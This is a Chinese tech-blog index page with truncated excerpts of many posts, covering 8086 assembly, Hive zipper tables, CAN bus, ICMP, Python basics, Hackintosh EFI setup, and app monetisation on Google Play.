			试编写一程序，把数组STRING中存放的20个8位二进制数分成正数数组和负数数组，并统计正数、负数和零的个数，结果分别存放在P、M、Z三个单元。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DATA SEGMENT
STRING DB 20 DUP(?)
POSI DB 20 DUP(?)
NEGA DB 20 DUP(?)
P DB 00H
M DB 00H
Z DB 00H
DATA ENDS
CODE SEGMENT
ASSUME CS:CODE,DS:DATA
START:​MOV AX,DATA
​MOV DS,AX
​XOR BX,BX
​MOV SI,BX
​MOV DI,BX
​MOV CX,20
LP:​MOV AL,STRING[BX]
​CMP AL,0
​JGE P1
​MOV NEGA[DI],AL
​INC DI
​INC M
​JMP NEXT
P1:​JNE P2
​INC Z
​JMP NEXT
P2:​MOV POSI[SI],AL
​INC SI
​INC P
NEXT:​INC BX
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e7fb0bba0bfc1dcdacb8735a1f4f172/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78a0c7d1a7ef587071fb51b48254c557/" rel="bookmark">
			数仓--拉链表（原理、设计以及在Hive中的实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		拉链表 什么是拉链表？谈到拉链表就不得不谈SCD(缓慢变化维问题)缓慢变化维怎么解决?(粗看有五种)保留初始值(不让改)改写属性值==增加维度新行==增加维度新列使用历史表 举一个具体的应用场景，来设计并实现一份拉链表，最后并通过一些例子说明如何使用我们设计的这张表（因为现在Hive的大规模使用，我们会以Hive场景下的设计为例）。拉链表的使用场景为什么使用拉链表拉链表的设计和实现在Hive中实现拉链表ods层的user表ods层的user_update表拉链表实现sql语句 拉链表和流水表查询性能拉链表回滚总结 什么是拉链表？ 所谓拉链，就是记录历史
记录一个事物从开始，一直到当前状态的所有变化的信息。我们可以使用这张表拿到最新的当天的最新数据以及之前的历史数据。既能满足反应数据的历史状态，又可以最大限度地节省存储空间 谈到拉链表就不得不谈SCD(缓慢变化维问题) 缓慢变化维，简称SCD（Slowly Changing Dimensions）一些维度表的数据不是静态的，而是会随着时间而缓慢地变化（这里的缓慢是相对事实表而言，事实表数据变化的速度比维度表快）这种随着时间发生变化的维度称之为缓慢变化维把处理维度表数据历史变化的问题，称为缓慢变化维问题，简称SCD问题举例 用户ID	用户名	出生日期 住址 114 张三	1988-09-08	北京市朝阳区 这个用户的数据不是一直不变，而是有可能发生变化。例如：用户修改了出生日期 或者用户修改了住址。 缓慢变化维怎么解决?(粗看有五种) 保留初始值(不让改) 用户体验不好
出生日期的数据，始终按照用户第一次填写的数据为准 改写属性值 对其相应需要重写维度行中的旧值，以当前值替换。因此其始终反映最近的情况。当一个维度值的数据源发生变化，并且不需要在维度表中保留变化历史时，通常用新数据来覆盖旧数据。这样的处理使属性所反映的中是最新的赋值。这种方法有个前提，用户不关心这个数据的变化。用户需要历史数据怎么办我要分析历史变化数据怎么办 增加维度新行 典型代表就是拉链表。用户维度表
修改前： 用户ID	用户ID	用户名	出生日期	住址 9527	114	张三	1988-09-08	北京市朝阳区 修改后：
编号	用户ID	用户名	出生日期	住址 9527	114	张三	1988-09-08	北京市朝阳区 9528	114	张三	1992-09-08	北京市海淀区 增加维度新列 用不同的字段来保存不同的值，就是在表中增加一个字段，这个字段用来保存变化后的当前值，而原来的值则被称为变化前的值。总的来说，这种方法通过添加字段来保存变化后的痕迹。用户改多少列我要增加多少列修改前： 编号	用户ID	用户名	出生日期	住址 9527	114	张三	1988-09-08	北京市朝阳区 修改后
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78a0c7d1a7ef587071fb51b48254c557/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff3259f21aed8482c74788126f106664/" rel="bookmark">
			thymeleaf的th:each双层嵌套循环（一个最简单的Demo实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Controller层传给前端的东西 List&lt;Blog&gt; blogQueries = blogService.queryAll(); model.addAttribute("blogQueries", blogQueries); 上面的代码，第一行 查询出一堆blog来，并将这一堆blog封装进一个名为blogQueries的List集合。第二行就是将该List集合传到前端去。
Blog(博客)有三个字段：
title – 标题（String类型）
description – 摘要 （String类型）
types – 分类 （List&lt;Type&gt;类型）
一个博客，有一个标题，一个摘要，还有一堆类型。
最后一个types字段，就是套了一个娃，将所有查询出的type封装成一个集合，再把该集合赋值给了blog字段(为什么这么套是为了后面双层嵌套取出来)
html前端编写 &lt;!--第一层循环：th:each="blog : ${blogQueries}"--&gt; &lt;section th:each="blog : ${blogQueries}"&gt; &lt;span th:text="${blog.title}"&gt;文章标题&lt;/span&gt; &lt;span th:text="${blog.description}"&gt;文章摘要&lt;/span&gt; &lt;!--第二层循环：th:each="type : ${blog.types}"--&gt; &lt;a th:each="type : ${blog.types}"&gt; &lt;span th:text="${type.name}"&gt;文章的分类们&lt;/span&gt; &lt;/a&gt; &lt;/section&gt; 简单实现了一下th:each双层嵌套循环的原理，并取出来了里面的数据。如果解决了您的问题，留个赞再走吧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45f6b8903f8c15b7007e6b8eaeb2a559/" rel="bookmark">
			tms570 can 接收大量数据_CAN总线传输协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、定义 CAN总线，即控制器局域网总线，是一种用于实时应用的串行通讯协议总线。
它可以使用双绞线、同轴电缆或光纤来传输信号，因其高性能、高可靠性和高实时性等特点，已经成为了世界上应用最广泛的现场总线之一。
CAN总线最高传输速率可达1Mbps(通信距离最长40m)，如果降低传输速率，其直接通信的最远距离可达10km(速率5Kbps以下)，其总线上的节点数可达110个。
二、工作原理 1. CAN总线没有主从节点之分，所有CAN总线上的节点都是地位等价的。
当CAN总线上的一个节点发送数据时，它以报文的形式广播给网络中的而所有节点；这样对于每个节点来说，无论数据是否发给自己，都对其进行接收。
CAN总线每组报文开头的11位字符为标识符，定义了报文的优先级。
在同一个总线中，标识符是唯一的，不可能有两个节点发送具有相同标识符的报文。
接收节点也会根据标识符来判断是否接收这帧信息，一般称这项技术为报文滤波技术。
3. CAN总线接收节点可以通过远程数据请求发送远程帧请求发送节点发送相应的数据，回应节点传送的数据帧与请求数据的远程帧具有相同的标识符。
4. CAN总线的优先权由发送数据报文中的标识符决定报文占用总线的优先权；标识符越小，优先权越高。
5. CAN总线的仲裁机制：只要总线空闲，任何节点都可以向总线发送报文。
如果有两个或两个以上的节点同时发送报文，就会引起总线访问碰撞。通过使用标识符逐位仲裁可以解决这个碰撞问题。而当具有相同标识符的数据帧和远程帧同时发送时，数据帧优先于远程帧。
6. 目前CAN总线通信协议仅仅包括OSI七层互联参考模型中的数据链路层和物理层。
三、物理层 1. CAN总线物理层主要采用两个差分传输信号线组成CAN总线网络，分别为CANH和CANL，所有CAN总线上的节点都可以连接到这两条差分信号传输网络上进行通信。
2. CAN节点一般由两部分组成：CAN收发器、CAN控制器。
CAN收发器负责将CAN控制器的TTL或CMOS的电平信号转换为CAN差分模拟电平信号进行数据传输；也将CAN的差分模拟电平信号转换为TTL/CMOS的电平信号送到CAN控制器，以实现完整的双向通信。
CAN控制器负责解析来自CAN收发器送来的数据，也将用户的数据传送到CAN收发器并发送出去；CAN控制器一般具备数据帧的解析与解码，数据屏蔽与滤波，数据帧的打包与封装等功能，是与用户交互的端口。
下图是一般的CAN节点的构造电路图。
3. CAN总线物理层标准：CAN协议经过ISO标准化后有ISO11898标准(高速CAN)和ISO11519-2标准(低速CAN)两种，这两种标准的数据链路层是一样的，但是物理层不同。
4. CAN总线显性与隐性：CAN2.0规范定义了两种互补的逻辑数值：显性和隐性。同时传送显性和隐性位时，总线呈现显性状态；同时传送显性状态位时，总线呈现显性状态；同时传送隐性状态位时，总线呈现隐性状态。显性数值表示逻辑0，隐性数值表示逻辑1。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c06657717008f209818902d1a36ab683/" rel="bookmark">
			我是如何从 0 到 1 在 Google Play 上有稳定收入的？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天来分享下我是如何在 Google Play 上开发应用赚钱的，虽然不多，上个月差不多 500 块钱，虽然很少，但是都是睡后收入，而且收入每个月都在稳步增长。
首先介绍下自己，90 年，老家陕西农村，09 年上大学，计算机相关专业，2013 年毕业。目前已婚，小孩 3 岁，刚上幼儿园。
在学校编程基本上学了个皮毛，在大二有幸参加了 Java 培训，在大三下学期，找到了一份 Android 开发工作。也就是在 2012 年 7 月 11 号，正式进入一个小公司实习。当时 Android，iOS 还都是刚起步，应用很缺乏。各个广告平台陆续才开始冒出来。因为会 Android 开发的人也很少，公司需要，也就开始做 Android 了，一做就是 8 年时间。最早在 2013 年的时候，无意间接触到了 Android 软件加广告赚钱的方式，开发了一款产品，也可以说是 Demo，集成了有米广告，当时用公司测试机刷了 100 多块钱，提现后，就在没管过了。如果当时好好兼职做产品，可能人生会是另一种样子。
之后从第一家公司离职后，做的都是国内项目，到 2017 年，加入了一家公司，开始接触 Google Play。当时也没意识到自己开发产品赚钱，因为没有那个意识。就像身边做 Android 开发的，大部分人只知道上班，要么就是接外包赚钱。很少有独立开发产品赚钱的。到了 2019 公司开始出现问题，因为公司做的社交产品，一直靠融资活着，但是 2019 年大环境很不好，融不到钱。公司就裁掉了一波人，当时我也被裁了。
裁员完了之后，公司开始寻找产品变现的思路，因为之前一直靠别人融资，从来没想过自己赚钱。但是产品再好，赚不到钱。公司的发展不可能继续持续下去。于是基于 Google Play 的变现之路探索开始了。自己也从中学会了很多，订阅，广告之类的。不幸的是年底又被公司优化了。
从公司离开后，没有立马闲着，立马就去上班了。恰逢年底。工作非常不好找，投出去简历基本上没人回复，因为过年了，很多公司都不招人。无奈之下只能去外包了。之前从来没有进入外包，听说各种不好。但是没办法，要还房贷，养娃。去了外包待了 3 个月，去了之后，每天都想离职、不能用手机，反正是各种不爽。但是还是坚持了一个月，因为快过年了，没有更好的去处。本来打算开年就辞职，找一份好工作，结果年还没过完，就迎来了新冠。上不了班，在家也是闲着。就开始想自己能不能做一款产品，发布到 Google Play 上去，但是想了很久，也没有去做，账号什么的都注册好了，就是没有行动。又过了几个月，终于可以上班了，然后果断辞职，找到了同事待的一家公司，能轻松一点，但是工资也相对比较低。当时就想着找个不加班的，做自己产品，看能不能养活自己。
因为经过这几年的工作，发现在公司上班，赚不到钱，基本上就混个温饱，而且做得很不开心。于是入职新公司后，和同事合作搞了一款应用，美图美文。因为不知道做什么，做这个应用，是以为当时在 Google Play 闲逛，发现有个繁体中文的 App 叫内涵语录，功能很简单。就是一些常用的语录，然后可以分享给朋友，保存之类的。但是看下载量 10 万多。而且好评很多，评分 500 多个。于是就尝试着做了一个。同事负责服务器，另一个负责收集图片，然后我负责 Android 客户端。几个晚上就搞定了，然后上线了。经过摸索，终于上线了第一款应用。之前在公司虽然也接触 Google Play，但是那时的包都是产品上架的。自己发布产品，所有的流程重新走了一遍，把 Google Play 上线应用的流程也都跑了一遍。上架之后，陆陆续续有用户下载，自己也用几个号刷了评分。然后隔了几天，又发布了个版本，加上了个广告。然后每天上班的时候，都会看一看今天有没有新用户，有没有广告收入。经过几天发现广告有收入，但是很少。基本上几天才 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c06657717008f209818902d1a36ab683/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba9fee257e8d18b10bd9d5b81de4dcaf/" rel="bookmark">
			ICMP报文详解之ping实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ping是向网络主机发送ICMP回显请求(ECHO_REQUEST)分组，是TCP/IP协议的一部分。主要可以检查网络是否通畅或者网络连接速度快慢，从而判断网络是否正常。
ping命令底层使用的是ICMP，ICMP报文封装在ip包里。它是一个对IP协议的补充协议，允许主机或路由器报告差错情况和异常状况。
ICMP报文格式和各个字段的含义
ICMP报文由首部和数据段组成。通过wireshark软件的使用加深对此的了解（差错报告、控制报文和请求应答报文）。
回送请求的具体报文：
回送应答的具体报文：
ICMP报头格式：
ICMP报文包含在IP数据报中，IP报头在ICMP报文的最前面。一个ICMP报文包括IP报头（至少20字节）、ICMP报头（至少八字节）和ICMP报文（属于ICMP报文的数据部分）。当IP报头中的协议字段值为1时，就说明这是一个ICMP报文。ICMP报头如下图所示。
0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Type | Code | Checksum | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Identifier | Sequence Number | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Optional Data ... +-+-+-+-+- ICMP结构体定义:
struct icmp { uint8_t icmp_type; uint8_t icmp_code; uint16_t icmp_cksum; uint16_t icmp_id; uint16_t icmp_seq; }; Type：占8位
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba9fee257e8d18b10bd9d5b81de4dcaf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8ad119618ad7d3f85db06720fba81dc/" rel="bookmark">
			python标准库很丰富支持多种编程范式_计算机考试简答题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1
、简述
python
的特点：
Python
具有简单易学，免费、开源，可扩展性、可嵌人性和可移植性强，代码规范、代
码具有较好可读性，
Python
标准库很丰富，支持命令式编程、面向对象程序设计、图效式
编程、泛型编程等多种编程范式等特点。
2
、
python
中缩进的作用是什么？
对于
Python
而言代码缩进是一种语法，缩进非常重要，是用来界定代码块的，相当于其他编程语言里的大括号。
3
、简单解释
python
基于值的自动内存管理方式。
Python
的内存管理
机制可以从三个方面来讲：
(
1
)
垃圾回收
：
对
Python
语言来讲，对象的类型和内存都是在运行时确定的。这也是
Python
语言为对变量内存地址的分配是在运行时自
动判断变量类型并对变量进行赋值原因。
(
2
)引用计数：
Python
采用了类似
Window
s
内核对象
一样的方式来对内存进行管理。每一个对象，都维护这一个对指向
该对对象的引用的计数。
(
3
)内存池机制：
Python
的内存机制以金字塔行，
-1
，
-2
层主要有
操作系统
进行操作，第
0
层是
C
中的
malloc
，
free
等
内存分配
和释放函
数进行操作；第
1
层和第
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8ad119618ad7d3f85db06720fba81dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04f1185838c6fdc4ec834eb0fb1edc92/" rel="bookmark">
			python查找列表是否存在一个数_检查python中的列表中是否存在一个数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你可以做
if item not in mylist:
mylist.append(item)
但是你应该真的使用一套，像这样：
myset = set()
myset.add(item)
编辑：如果顺序很重要，但您的列表非常大，您应该同时使用列表和集合，如下所示：
mylist = []
myset = set()
for item in ...:
if item not in myset:
mylist.append(item)
myset.add(item)
这样，您可以快速查找元素存在，但是您可以继续订购。如果您使用天真的解决方案，您将获得O(n)性能的查找，如果您的列表很大，那可能是坏的
或者，@larsman指出，您可以使用OrderedDict具有相同的效果：
from collections import OrderedDict
mydict = OrderedDict()
for item in ...:
mydict[item] = True
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b8cdca6583e375b96191e2f6e984778/" rel="bookmark">
			Temporal Convolutional Networks for Action Segmentation and Detection论文及keras代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Temporal Convolutional Networks for Action Segmentation and Detection Lea C, Flynn M D, Vidal R, et al. Temporal convolutional networks for action segmentation and detection[C]//proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2017: 156-165.
Motivation 行为细分（Action Segmentation）方法预测在一个视频中每一帧出现什么动作。
检测（Detection）方法输出一个稀疏的动作细分集合，这个集合中一个细分由起始时间，和类别标签定义。
传统的方法将这个问题分解为两步：
首先从视频的帧中提取局部的时空特征；再将他们喂入一个时间分类器中捕捉高级的时间模式。
其中第二步最近的时间模型主要有三种，但是他们都是有对应的缺点：
Sliding window action detectors：太短不能捕获长期的时间模式Segmental models：捕获段内属性，但是忽略了长期的潜在依赖Recurrent models：注意力有限且很难正确训练。 Model Encoder-Decoder-TCN 编码器:
E ( l ) ∈ R F l × T l E^{(l)}\in R^{F_l\times T_l} E(l)∈RFl​×Tl​
时间卷积，非线性激活，最大池化
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b8cdca6583e375b96191e2f6e984778/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc4cb80d02319187767b918151986034/" rel="bookmark">
			手把手教你安装黑苹果之openCore-0.6.3 EFI制作全过程，非常详细
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、EFI是什么？二、获取EFI1.Hackintosh黑苹果长期维护机型整理清单2.搜索efi 二、自制EFI1.OC Gen-X图形化一键自动生成EFI(推荐)2.手动下载EFI所需要的文件下载哪些文件下载open core复制出EFI删除冗余文件 下载HfsPlus.efi下载必备KextsVirtualSMCLiluWhateverGreenUSBInjectAll解压Kexts并放到Kexts目录之中 生成ACPIconfig.plist配置config.plist下载安装ProperTree运行ProperTree打开配置文件config.plist 调整config.plist参数笔记本电脑Haswell平台confg.plist配置信息删除Root\DeviceProperties\Add 目录下所有的项目Root\Kernel\Quirks 下参数配置Misc 下面的修改如下图NVRAMPlatformInfo BIOS设置禁用下面这些启用下面这些 EFI写入到u盘安装macOS Big Sur修改U盘的EFI分区文件 EFI效果实测与下载测试结果 驱动笔记本自带的键盘鼠标驱动有线网卡驱动IGPU图形加速正片开始 驱动声卡方法一：VoodooHDA-OC方法二：AppleALC 驱动蓝牙功能无线网卡驱动方式一：更换网卡模块方式二：usb无线网卡+万能usb无线网卡 追求完美电池！电池！触控板快捷键调节亮度睡眠开启HDMI音频机型设置按键优化文件下载美化启动项选择界面隐藏开机日志OpenCore版本升级实例-0.6.3升级至0.6.4github下载慢怎么办方法一：方法二： 方法三：方法四： 总结 前言 这篇文章主要是记录自己动手安装Big Sur在过程，和心理。略显繁琐，请自行跳跃观看。
2020年12月08日更新： 有小伙伴反应,github上下载比较慢，我把用到的文件保存到网盘里供大家下载使用。 链接:
https://pan.baidu.com/s/1qnnBumyc3ZanuI04OACasg 提取码: b7ps
macOS Big Sur 正式版于 11 月 12 日星期四(北京时间 11 月 13 日)发布，改动还是挺大的。基于M1苹果自研芯片的macbook也发布了，看了各种up主的评测，网上一堆好评。我馋了好久了，奈何囊中羞涩。等我有钱了，一定要买macbook。
看了一眼跟了我6年之前的拯救者14（初代拯救者又叫Lenovo Gaming I7 4700hq）,我想把跟我6年的老战友升级到最新的macOS系统。安装之前我电脑上已经安装了macOS Catalina，能安装这个是因为大概一年前在论坛上运气不错找到跟我同款机型的EFI分享。但是目前为止我这个机型在各种论坛，GitHub上找了一圈都没有Big Sur相关的EFI。想想原因很简单，6年前的电脑已经变的冷门了，很多玩这个电脑的大佬已经换新电脑了。而且Big Sur正式版本刚发布不足一个月，找不到也正常。
热门机型可以到网上找找EFI分享，但是冷门机型咋办？也许在等等时常关注着各种论坛，运气好哪天能碰到呢？想了想，这次我不要做伸手党，自己动手，丰衣足食。在等等我们就老了（我和我的电脑），在等等就尝不到鲜了，老是吃别人玩剩下的可不好！
我的型号：联想（Lenovo）拯救者 14.0英寸游戏本（i7-4720HQ 8G 128G SSD+1T GTX960M )
我的最终成品EFI：https://blog.csdn.net/lxyoucan/article/details/111876976
一、EFI是什么？ EFI是可扩展固件接口（Extensible Firmware Interface）的缩写，是英特尔公司推出的一种在未来的类PC的电脑系统中替代BIOS的升级方案。
安装macOS 最难的部分可能就是EFI这部分了吧！这部分是花时间最多的地方，因为每种型号的电脑使用EFI都不相同。
二、获取EFI 如果能找到大佬制作的跟你机型相同的EFI，拿来主义，岂不美哉！
1.Hackintosh黑苹果长期维护机型整理清单 地址：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc4cb80d02319187767b918151986034/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58ec955e981a42e5674a92fd671b2679/" rel="bookmark">
			python自动控制库_AutoPy是一个简单的，跨平台的Python自动化GUI库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AutoPy Introduction and Tutorial
Introduction
AutoPy is a simple, cross-platform GUI automation library for Python. It includes functions for controlling the keyboard and mouse, finding colors and bitmaps on-screen, and displaying alerts.
Currently supported on macOS, Windows, and X11 with the XTest extension.
Getting Started
Requirements
Python 2.7, or Python 3.5 and up.
Rust 1.23.0-nightly 2019-02-06 or later (unless using a binary wheel distribution).
macOS 10.6 and up.
Windows 7 and up.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58ec955e981a42e5674a92fd671b2679/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbc9434351668bde73326e881aaab6a9/" rel="bookmark">
			python 选择判断_第2关 灭霸的选择---python中的条件判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关卡目标：
在这关需要学习python的中条件判断，学会使用if/elif /else 去进行条件判断，以及条件嵌套；重点理解代码块的层级关系，掌握python的代码缩进
关卡小贴士：
需要特别注意缩进问题，以及代码块执行顺序，多去对比各个例子之间的差异，更容易掌握本关卡的知识。
建议大家多动手在网页环境中或者本地vscode中多运行代码，实践才是检验真理的唯一标准！
关卡知识图谱
本关卡的知识点比较密集，需要注意的点比较多，所以特意使用了第8关教方法来重新整理原来的学习笔记。本篇分为2个部分：
1、用法查询笔记：记录知识点的基础用法
2、深度理解笔记：总结、理解知识的使用场景
一、用法查询笔记：
1、单向判断：只判断某一种情况
用法：完整的单向判断由两个部分构成：条件判断语句+执行语句；执行语句可以是一个或多个语句，也可以是一个代码块。
条件判断的结构为：关键词+条件表达式+冒号，具体到上面例子就是，if是关键词，a&gt;0是条件表达式，冒号(:)；代码的意义是，如果a&gt;0成立，那么执行下一级语句print("a&gt;0")
注意：执行语句是条件判断语句的下一级，也就是print("a&gt;0")要比if a&gt;0:语句缩进一级。
2、双向判断：if...else 判断非此即彼的情况(两种情况的判断)
用法：if语句和单向判断相同，增加了一个else语句，else是其他情况的意思，也就是只要不符合if后面的条件，就会落到else中，例如，a&gt;3不成立，那么a&lt;=3一定成立，亦即if和else是对立的，只要不执行if后语句，就一定会执行else后的语句。
注意：else本身是隐含了条件的，所以后面直接跟冒号，而不能再添加条件上去；其次，要先有同级的if(或者循环中的while)，然后才能使用else，else不能单独出现。
3、多向判断：if-elif...elif-else 判断多种情况(3种以上的情况)
用法：双向判断中间增加了一个elif，后面需要像if一样带条件。elif其实是else if的缩写，含义与if一样，用法区别是在一段多向判断中if能且只能用在第1个条件；elif只能用在第2个以上的条件，允许多次使用(只要条件够多，多少次都可以)；else只能用在最后一个条件，且不是必要的(也就是说可以以elif的条件结束多向判断)
注意：中间可以根据需要使用多个elif 条件，最后的else并非是必要的，没有需要可以不用，else/elif前面一定要有同级的if
4、嵌套：
在基础条件满足的情况下，再在基础条件底下增加额外的条件判断。
用法：简单来说，嵌套就是条件判断语句后的执行语句是一个单向/多向判断语句块，在基础条件成立的前提下再进行额外条件的判断，具体到上述例子，先判断是否及格，再在及格这些人中去判断90以上和90以下的学生；而在不及格的学生中判断40分以上和40分以下的。
注意：要理解条件之间的层级关系，掌握好代码块的缩进，这才不容易出错。缩进使用快捷键ctrl+[和ctrl+](见下图)，而不是使用tab键。
二、深度理解笔记：条件判断中容易迷惑的点
1、什么时候应该缩进？
1)、在 Python 代码里看到冒号 时就说明这个语句(statement)还没说完，还有下个语句，此时后面的语句若另起一行就必须缩进。比如：
那么这后面的第4行应不应该缩进呢？
2)、判断与冒号这个语句是并列关系还是上下级关系：并列关系则应该对齐，上下级关系则应该保持缩进。
2、符号规范
等于号：==；大于等于号&gt;=；小于等于号：&lt;=
3、做题的时候发现if-if-else这样的结构居然也没有报错，而且还得到正确的答案，比如：
这是怎么回事呢？难道if和elif是一样的吗？通过查阅资料以及自己的测试，发现了其中的差别：
稍微解释一下，这样写表示上面是由一个单向判断和一个双向判断组成的两个判断部分，而非一个多向判断了。当a&gt;9时，会同时执行 print ("a&gt;9")和print ("a&lt;=5")两个语句
三、思考题
有3个任意数a、b、c，用代码来判断三者的大小，对任意的三个数都成立
提示：使用条件嵌套，分类讨论，能够独立完成本题目说明对条件嵌套已经掌握的不错了哦~(答案获取方式，公众号回复：答案1)
欢迎在留言中留下你的答案
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df3121d04aaad1994b6a2edd1cd115e2/" rel="bookmark">
			004. kogito能干啥
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 引子 关于工作流引擎的资料其实也不算少，网上的教程，书籍，还有某站很多视频教学内容。但针对kogito的，还是太少太少了。所以有了前面三节的尝试后，也许多了几天官方文档，初步整理一下，通过kogito究竟能做点啥？
2. 啥！ 2.1. 业务流程建模 基于BPMN2标准来做流程建模，当前kogito版本为1.0.0.Final，还没有覆盖全部的BPMN2标准组件，但已经基本构用。具体可以查询官方说明。
据官方的描述，如果采用了BPMN2的一些建模工具，使用了kogito不支持的组件，你在编译代码时会报错；另随着kogito的版本升级，覆盖组件将会趋于完整。
2.2. 决策建模 支持基于基于DMN1.2标准的决策建模支持基于DRL规则语言支持基于excel文件的决策表 也可以同时使用这三种不同的规则工具，建立决策模型。总感觉有点叼叼的。
2.2.1 DMN 全称Decision Model and Notation (DMN) models，下图为官方的一个示例
This image is from kogito official document. You can find it from &gt;&gt;LINK&lt;&lt;
2.2.2 DRL 规则定义语言，在运行第二个示例时就有接触，如果拆分开，原属于规则引擎Drool定义的规则定义标准，定义如下：
package org.acme.travels import org.acme.travels.Person; rule "Is adult" ruleflow-group "person" when $person: Person(age &gt;= 18) then modify($person) { setAdult(true) }; System.out.println($person.toString()) end This sample is from kogito official document. You can find it from &gt;&gt;LINK&lt;&lt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df3121d04aaad1994b6a2edd1cd115e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33531497587bebc1d5659f48408172cb/" rel="bookmark">
			从另一个角度去解读Blinker，剖析精简源码，学习开源精神，菜鸟哥还是忍不住对它下手了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、解读起因2、解读点2.1 解读硬性要求 3、解读过程3.1 解读理念3.1.1 官方说明 3.2 解读组合方式3.2.1 绿色 —— 必选宏BLINKER_BLE —— ble蓝牙通信BLINKER_WIFI、BLINKER_MQTT —— WiFi通信BLINKER_PRO —— 略BLINKER_PRO_ESP、BLINKER_WIFI_AUTO—— 略BLINKER_AT_MQTT—— AT开发方式BLINKER_WIFI_GATEWAYBLINKER_WIFI_SUBDEVICEBLINKER_NBIOT_SIM7020BLINKER_NBIOT_SIM7000BLINKER_PRO_SIM7020BLINKER_GPRS_AIR202BLINKER_PRO_AIR202BLINKER_LOWPOWER_AIR202BLINKER_QRCODE_NBIOT_SIM7020BLINKER_QRCODE_NBIOT_SIM7000 3.2.2 浅蓝色—— 附加宏BLINKER_APCONFIG —— webSocket 局域网配网BLINKER_ESP_SMARTCONFIG —— smartconfig配网BLINKER_MIOT_LIGHT—— 小米小爱BLINKER_MIOT_OUTLET—— 小米小爱BLINKER_MIOT_MULTI_OUTLET—— 小米小爱BLINKER_MIOT_SENSOR —— 小米小爱BLINKER_DUEROS_LIGHT —— 百度小度BLINKER_DUEROS_OUTLET —— 百度小度BLINKER_DUEROS_MULTI_OUTLET —— 百度小度BLINKER_DUEROS_SENSOR —— 百度小度BLINKER_ALIGENIE_LIGHT —— 天猫精灵BLINKER_ALIGENIE_OUTLET —— 天猫精灵BLINKER_ALIGENIE_MULTI_OUTLET —— 天猫精灵BLINKER_ALIGENIE_SENSOR —— 天猫精灵 3.3 解读源码细节 4、重新认识Blinker4.1 使用Arduino &amp; 蓝牙接入4.2 使用esp8266 &amp; WiFi接入4.3 使用esp32 &amp; 蓝牙接入4.4 NB-IoT支持 授人以鱼不如授人以渔，目的不是为了教会你具体项目开发，而是学会学习的能力。希望大家分享给你周边需要的朋友或者同学，说不定大神成长之路有博哥的奠基石。。。
快速导航
单片机菜鸟的博客快速索引(快速找到你要的)如何找到大部队 重点说一下，麻烦三连点赞，你的点赞是博主创作的前进动力。
1、解读起因 经常有粉丝朋友问我：
请问Blinker怎么开发？Blinker的这个错误怎么解决？Blinker找不到库怎么办？…
所以，我还是通读了一下官方文档点灯科技Blinker 以及翻阅了一下 Arduino Blinker的源码库（设备端）
	</div>
	<div class="list__footer clearfix">
